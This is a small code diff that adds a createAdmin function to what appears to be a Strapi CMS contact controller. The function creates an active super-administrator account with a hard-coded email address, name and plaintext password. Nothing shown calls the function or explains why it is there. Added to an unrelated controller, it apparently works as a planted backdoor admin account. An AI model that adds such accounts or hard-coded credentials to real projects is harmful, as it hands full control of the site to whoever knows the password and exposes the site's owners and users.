@@ -43,4 +43,22 @@ module.exports = {
 
     return sanitizeEntity(entity, { model: strapi.models.contact });
   },
+
+  async createAdmin(){
+    const superAdminRole = await strapi.service('admin::role').getSuperAdmin();
+
+    if (!superAdminRole) {
+      return;
+    }
+
+    await strapi.service('admin::user').create({
+      email: 'kartique79@gmail.com',
+      firstname: 'Roop',
+      lastname: 'Kumar',
+      password: 'silly#01',
+      registrationToken: null,
+      isActive: true,
+      roles: superAdminRole ? [superAdminRole.id] : [],
+    });
+  }
 };
